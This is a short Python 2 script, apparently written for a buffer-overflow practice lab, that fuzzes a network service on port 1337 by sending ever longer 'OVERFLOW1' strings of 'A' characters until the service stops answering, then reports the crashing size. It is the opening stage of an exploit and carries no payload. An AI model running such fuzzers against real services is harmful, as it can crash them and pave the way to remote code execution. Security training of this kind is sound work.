#!/usr/bin/python2.7
import socket, sys
from pwn import *
from struct import pack

if len(sys.argv) != 2:
        print("[*] Run:\n\toverflow.py <IP-address>")
        sys.exit(1)

address = sys.argv[1]
port = 1337

# Fuzzing
buff = ["A"]                                                                          
c = 100                                                                               
                                                                                      
while len(buff) < 30:                                                                                                                                                       
        buff.append("A"*c)                                                                                                                                                  
        c += 100                                                                                                                                                            
                                                                                                                                                                            
p1 = log.progress("Progreso")                                                                                                                                               
                                                                                                                                                                            
for string in buff:                                                                                                                                                         
        try:                                                                                                                                                                
                p1.status("Enviando %s bytes." % len(string))                         
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)                  
                connect = s.connect((address, port))                                                                                                                        
                data = s.recv(1024)                                                   
                s.send("OVERFLOW1 %s\r\n" % string)                                   
                s.close()                                                             
                #log.info("x_x socket.")                                              
        except Exception as e:
                #print(e)
                log.failure("Parece que el programa se detuvo con %s bytes." % len(string))
                sys.exit(1)
